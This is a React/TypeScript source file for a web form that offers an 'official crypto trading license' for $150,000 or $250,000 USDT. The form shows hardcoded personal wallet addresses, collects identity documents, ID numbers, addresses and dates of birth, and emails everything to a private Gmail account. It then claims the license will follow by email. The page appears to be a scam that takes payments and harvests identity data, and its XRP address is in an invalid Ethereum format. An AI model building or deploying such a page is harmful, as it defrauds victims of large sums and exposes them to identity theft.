import { useState, FormEvent } from 'react';
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Textarea } from "@/components/ui/textarea";
import { Checkbox } from "@/components/ui/checkbox";
import { AlertTriangle, Loader2, ShieldCheck, Copy, Check } from "lucide-react";
import { toast } from "@/components/ui/use-toast";
import { sendAdminNotification } from "@/utils/emailService";

interface WalletAddresses {
  BTC: string;
  ETH: string;
  USDT_TRON: string;
  USDT_ETH: string;
  XRP: string;
}

const WALLET_ADDRESSES: WalletAddresses = {
  BTC: "bc1qnsrsf0jr8aam9ngnu64c5s7rxue6gdjpauz6w4",
  ETH: "0x7226A9A66E9e4f58fBcB67c9F1F7d52AFA9F8E2B",
  USDT_TRON: "TCPUeoFf4QsfjWEMTFX25PW5FHxQtBBTM1",
  USDT_ETH: "0x7226A9A66E9e4f58fBcB67c9F1F7d52AFA9F8E2B",
  XRP: "0x7226A9A66E9e4f58fBcB67c9F1F7d52AFA9F8E2B"
};

const ADMIN_EMAIL = "catosabastian@gmail.com";

interface ApplicationFormProps {
  onClose?: () => void;
}

const ApplicationForm = ({ onClose }: ApplicationFormProps) => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [applicantType, setApplicantType] = useState<'individual' | 'corporate'>('individual');
  const [selectedCategory, setSelectedCategory] = useState<'4' | '5'>('4');
  const [selectedCrypto, setSelectedCrypto] = useState<'BTC' | 'ETH' | 'USDT_TRON' | 'USDT_ETH' | 'XRP'>('BTC');
  const [copySuccess, setCopySuccess] = useState<string | null>(null);
  
  const handleCopyWallet = (crypto: string) => {
    navigator.clipboard.writeText(WALLET_ADDRESSES[crypto as keyof WalletAddresses]).then(() => {
      setCopySuccess(crypto);
      setTimeout(() => setCopySuccess(null), 2000);
    });
  };
  
  const getCryptoLabel = (crypto: string): string => {
    switch (crypto) {
      case 'BTC': return 'Bitcoin (BTC)';
      case 'ETH': return 'Ethereum (ETH)';
      case 'USDT_TRON': return 'Tether (USDT) - Tron Network';
      case 'USDT_ETH': return 'Tether (USDT) - Ethereum Network';
      case 'XRP': return 'XRP';
      default: return crypto;
    }
  };
  
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    const formData = new FormData(e.target as HTMLFormElement);
    const formDataObj = Object.fromEntries(formData.entries());
    
    try {
      const completeFormData = {
        ...formDataObj,
        submissionTime: new Date().toISOString(),
        applicantType,
        selectedCategory,
        selectedCrypto
      };
      
      const notificationSent = await sendAdminNotification(
        completeFormData,
        ADMIN_EMAIL
      );
      
      if (!notificationSent) {
        toast({
          title: "Admin Notification Status",
          description: "There was an issue sending the notification to administrators, but your application was received.",
          variant: "default",
        });
      } else {
        console.log("Admin notification email sent successfully to:", ADMIN_EMAIL);
      }
      
      toast({
        title: "Application Submitted Successfully",
        description: "Your payment is being verified. License will be emailed shortly.",
      });
      
      (e.target as HTMLFormElement).reset();
      
      if (onClose) {
        setTimeout(onClose, 1500);
      }
    } catch (error) {
      console.error("Error submitting application:", error);
      toast({
        title: "Submission Failed",
        description: "There was an error submitting your application. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div id="application">
      <div className="flex items-center gap-2 mb-4">
        <div className="h-1 w-12 bg-primary"></div>
        <span className="text-sm text-muted-foreground uppercase tracking-wider">Apply Now</span>
      </div>
      
      <h2 className="text-3xl font-bold mb-6">
        Crypto License Application
      </h2>
      
      <p className="text-muted-foreground mb-8">
        Complete the form below to apply for your official crypto trading license. All information is securely processed and verified.
      </p>
      
      <form id="licenseApplicationForm" onSubmit={handleSubmit}>
        <div className="space-y-8">
          <div className="space-y-4">
            <div className="mb-6 p-4 border border-amber-300 bg-amber-50 rounded-md flex items-start gap-3">
              <AlertTriangle className="h-5 w-5 text-amber-600 shrink-0 mt-0.5" />
              <div>
                <h4 className="text-sm font-semibold text-amber-800">Important Notice</h4>
                <p className="text-xs text-amber-800">
                  All information submitted is subject to verification. Providing false information may result in immediate license revocation and potential legal consequences.
                </p>
              </div>
            </div>
          
            <div className="space-y-4">
              <h3 className="text-lg font-semibold">Applicant Type</h3>
              <RadioGroup 
                name="applicantType" 
                defaultValue="individual" 
                className="flex flex-col space-y-1"
                required
                onValueChange={(value) => setApplicantType(value as 'individual' | 'corporate')}
              >
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="individual" id="individual" />
                  <Label htmlFor="individual">Individual Trader</Label>
                </div>
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="corporate" id="corporate" />
                  <Label htmlFor="corporate">Corporate Entity</Label>
                </div>
              </RadioGroup>
            </div>
          </div>
          
          {/* Personal Information */}
          <div className="space-y-4">
            <h3 className="text-lg font-semibold">
              {applicantType === "individual" ? "Personal Information" : "Corporate Information"}
            </h3>
            
            {applicantType === "individual" ? (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="firstName">First Name</Label>
                  <Input id="firstName" name="firstName" required />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="lastName">Last Name</Label>
                  <Input id="lastName" name="lastName" required />
                </div>
                <div className="space-y-2 md:col-span-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input id="email" name="email" type="email" required />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">Phone Number</Label>
                  <Input id="phone" name="phone" type="tel" required />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="dateOfBirth">Date of Birth</Label>
                  <Input id="dateOfBirth" name="dateOfBirth" type="date" required />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="country">Country of Residence</Label>
                  <Select name="country" defaultValue="US" required>
                    <SelectTrigger>
                      <SelectValue placeholder="Select country" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="US">United States</SelectItem>
                      <SelectItem value="UK">United Kingdom</SelectItem>
                      <SelectItem value="CA">Canada</SelectItem>
                      <SelectItem value="AU">Australia</SelectItem>
                      <SelectItem value="SG">Singapore</SelectItem>
                      <SelectItem value="DE">Germany</SelectItem>
                      <SelectItem value="FR">France</SelectItem>
                      <SelectItem value="JP">Japan</SelectItem>
                      <SelectItem value="OTHER">Other</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="idType">ID Type</Label>
                  <Select name="idType" defaultValue="passport" required>
                    <SelectTrigger>
                      <SelectValue placeholder="Select ID type" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="passport">Passport</SelectItem>
                      <SelectItem value="driverLicense">Driver's License</SelectItem>
                      <SelectItem value="nationalId">National ID</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2 md:col-span-2">
                  <Label htmlFor="idNumber">ID Number</Label>
                  <Input id="idNumber" name="idNumber" required />
                </div>
                <div className="space-y-2 md:col-span-2">
                  <Label htmlFor="address">Full Address</Label>
                  <Textarea id="address" name="address" placeholder="Street address, city, state/province, postal code" required />
                </div>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2 md:col-span-2">
                  <Label htmlFor="companyName">Company Name</Label>
                  <Input id="companyName" name="companyName" required />
                </div>
                <div className="space-y-2 md:col-span-2">
                  <Label htmlFor="registrationNumber">Registration Number</Label>
                  <Input id="registrationNumber" name="registrationNumber" required />
                </div>
                <div className="space-y-2 md:col-span-2">
                  <Label htmlFor="businessEmail">Business Email</Label>
                  <Input id="businessEmail" name="businessEmail" type="email" required />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="country">Country of Registration</Label>
                  <Select name="country" defaultValue="US" required>
                    <SelectTrigger>
                      <SelectValue placeholder="Select country" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="US">United States</SelectItem>
                      <SelectItem value="UK">United Kingdom</SelectItem>
                      <SelectItem value="CA">Canada</SelectItem>
                      <SelectItem value="AU">Australia</SelectItem>
                      <SelectItem value="SG">Singapore</SelectItem>
                      <SelectItem value="OTHER">Other</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="contactPerson">Contact Person</Label>
                  <Input id="contactPerson" name="contactPerson" required />
                </div>
              </div>
            )}
          </div>
          
          {/* Trading Information */}
          <div className="space-y-4">
            <h3 className="text-lg font-semibold">Trading Information</h3>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="tradingPlatforms">Primary Trading Platform</Label>
                <Select name="tradingPlatforms" defaultValue="binance" required>
                  <SelectTrigger>
                    <SelectValue placeholder="Select platform" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="binance">Binance</SelectItem>
                    <SelectItem value="kraken">Kraken</SelectItem>
                    <SelectItem value="coinbase">Coinbase</SelectItem>
                    <SelectItem value="kucoin">KuCoin</SelectItem>
                    <SelectItem value="bybit">Bybit</SelectItem>
                    <SelectItem value="okx">OKX</SelectItem>
                    <SelectItem value="multiple">Multiple Platforms</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="tradeVolume">Monthly Trade Volume (USD)</Label>
                <Select name="tradeVolume" defaultValue="500k-1m" required>
                  <SelectTrigger>
                    <SelectValue placeholder="Select volume" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="500k-1m">$500,000 - $1,000,000</SelectItem>
                    <SelectItem value="1m-5m">$1,000,000 - $5,000,000</SelectItem>
                    <SelectItem value="5m-10m">$5,000,000 - $10,000,000</SelectItem>
                    <SelectItem value="10m+">More than $10,000,000</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="tradingExperience">Trading Experience (Years)</Label>
                <Select name="tradingExperience" defaultValue="3-5" required>
                  <SelectTrigger>
                    <SelectValue placeholder="Select experience" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="1-3">1-3 years</SelectItem>
                    <SelectItem value="3-5">3-5 years</SelectItem>
                    <SelectItem value="5-10">5-10 years</SelectItem>
                    <SelectItem value="10+">More than 10 years</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="tradingStyle">Primary Trading Style</Label>
                <Select name="tradingStyle" defaultValue="spot" required>
                  <SelectTrigger>
                    <SelectValue placeholder="Select style" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="spot">Spot Trading</SelectItem>
                    <SelectItem value="margin">Margin Trading</SelectItem>
                    <SelectItem value="futures">Futures/Derivatives</SelectItem>
                    <SelectItem value="arbitrage">Arbitrage</SelectItem>
                    <SelectItem value="mixed">Mixed Strategies</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2 md:col-span-2">
                <Label htmlFor="tradingGoals">Trading Goals & Objectives</Label>
                <Textarea 
                  id="tradingGoals" 
                  name="tradingGoals" 
                  placeholder="Describe your trading goals, risk management strategy, and planned use of the license" 
                  required 
                />
              </div>
            </div>
          </div>
          
          {/* License Selection - Only Categories 4 & 5 */}
          <div className="space-y-4">
            <h3 className="text-lg font-semibold">License Selection</h3>
            
            <RadioGroup 
              name="licenseCategory" 
              defaultValue="4" 
              className="grid grid-cols-1 md:grid-cols-2 gap-4"
              required
              onValueChange={(value) => setSelectedCategory(value as '4' | '5')}
            >
              <div className={`border rounded-lg p-4 ${selectedCategory === '4' ? 'border-primary bg-primary/5' : ''}`}>
                <div className="flex items-start gap-2">
                  <RadioGroupItem value="4" id="category4" className="mt-1" />
                  <div>
                    <Label htmlFor="category4" className="font-semibold">Category 4 - Professional Trader</Label>
                    <p className="text-sm text-muted-foreground">$150,000 USDT</p>
                    <p className="text-xs text-muted-foreground mt-2">For trade volumes of $500,000+ minimum</p>
                    <Badge variant="secondary" className="mt-2 bg-accent text-white">Recommended</Badge>
                  </div>
                </div>
              </div>
              
              <div className={`border rounded-lg p-4 ${selectedCategory === '5' ? 'border-primary bg-primary/5' : ''}`}>
                <div className="flex items-start gap-2">
                  <RadioGroupItem value="5" id="category5" className="mt-1" />
                  <div>
                    <Label htmlFor="category5" className="font-semibold">Category 5 - Institutional Trader</Label>
                    <p className="text-sm text-muted-foreground">$250,000 USDT</p>
                    <p className="text-xs text-muted-foreground mt-2">For trade volumes of $1,000,000+ minimum</p>
                    <Badge variant="outline" className="mt-2">Premium</Badge>
                  </div>
                </div>
              </div>
            </RadioGroup>
          </div>
          
          {/* Payment Information */}
          <div className="space-y-4">
            <h3 className="text-lg font-semibold">Payment Information</h3>
            
            <div className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="paymentMethod">Select Payment Cryptocurrency</Label>
                <Select 
                  name="paymentCrypto" 
                  defaultValue="BTC"
                  required
                  onValueChange={(value) => setSelectedCrypto(value as 'BTC' | 'ETH' | 'USDT_TRON' | 'USDT_ETH' | 'XRP')}
                >
                  <SelectTrigger>
                    <SelectValue placeholder="Select cryptocurrency" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="BTC">Bitcoin (BTC)</SelectItem>
                    <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
                    <SelectItem value="USDT_TRON">Tether (USDT) - Tron Network</SelectItem>
                    <SelectItem value="USDT_ETH">Tether (USDT) - Ethereum Network</SelectItem>
                    <SelectItem value="XRP">XRP</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="p-6 border bg-muted/30 rounded-lg">
                <h4 className="font-semibold mb-2">Payment Instructions</h4>
                <p className="text-sm text-muted-foreground mb-4">
                  Please send the exact amount corresponding to your selected license tier to the wallet address below:
                </p>
                
                <div className="space-y-4">
                  <div className="p-3 bg-background border rounded-md">
                    <div className="flex items-center justify-between mb-1">
                      <Label className="text-xs text-muted-foreground">
                        {getCryptoLabel(selectedCrypto)} Wallet Address
                      </Label>
                      <Button 
                        type="button" 
                        variant="ghost" 
                        size="sm" 
                        className="h-8 gap-1 text-xs"
                        onClick={() => handleCopyWallet(selectedCrypto)}
                      >
                        {copySuccess === selectedCrypto ? (
                          <>
                            <Check className="h-3 w-3" />
                            Copied
                          </>
                        ) : (
                          <>
                            <Copy className="h-3 w-3" />
                            Copy
                          </>
                        )}
                      </Button>
                    </div>
                    <div className="font-mono text-xs sm:text-sm break-all bg-muted/50 p-2 rounded border">
                      {WALLET_ADDRESSES[selectedCrypto]}
                    </div>
                  </div>
                  
                  <div>
                    <Label htmlFor="transactionId" className="text-sm">Transaction ID/Hash</Label>
                    <p className="text-xs text-muted-foreground mb-2">
                      Enter the transaction ID after sending the payment
                    </p>
                    <Input id="transactionId" name="transactionId" className="font-mono" required />
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          {/* Additional Information */}
          <div className="space-y-2">
            <Label htmlFor="additionalInfo">Additional Information (Optional)</Label>
            <Textarea 
              id="additionalInfo" 
              name="additionalInfo" 
              placeholder="Any additional information you would like to provide, including special requirements or questions"
            />
          </div>
          
          {/* Agreements */}
          <div className="space-y-4">
            <div className="flex items-top space-x-2">
              <Checkbox id="termsAgreement" name="termsAgreement" required />
              <label
                htmlFor="termsAgreement"
                className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
              >
                I certify that all information provided is accurate and complete. I understand that providing false information may result in license revocation and potential legal consequences.
              </label>
            </div>
            
            <div className="flex items-top space-x-2">
              <Checkbox id="privacyAgreement" name="privacyAgreement" required />
              <label
                htmlFor="privacyAgreement"
                className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
              >
                I consent to the verification of my identity and trading history as part of the licensing process, including KYC/AML procedures.
              </label>
            </div>

            <div className="flex items-top space-x-2">
              <Checkbox id="complianceAgreement" name="complianceAgreement" required />
              <label
                htmlFor="complianceAgreement"
                className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
              >
                I agree to comply with all applicable regulations and maintain the licensing requirements throughout the validity period.
              </label>
            </div>
          </div>
        </div>
        
        <div className="mt-8 flex flex-col gap-4">
          <p className="text-sm text-muted-foreground text-center w-full">
            By submitting this application, you agree to our <a href="#" className="text-primary underline">Terms of Service</a> and <a href="#" className="text-primary underline">Privacy Policy</a>.
          </p>
          
          <Button 
            className="w-full gap-2" 
            size="lg"
            type="submit"
            disabled={isSubmitting}
          >
            {isSubmitting ? (
              <>
                <Loader2 className="h-4 w-4 animate-spin" />
                Processing Application...
              </>
            ) : (
              <>
                <ShieldCheck className="h-4 w-4" />
                Submit Application
              </>
            )}
          </Button>
        </div>
      </form>
    </div>
  );
};

export default ApplicationForm;
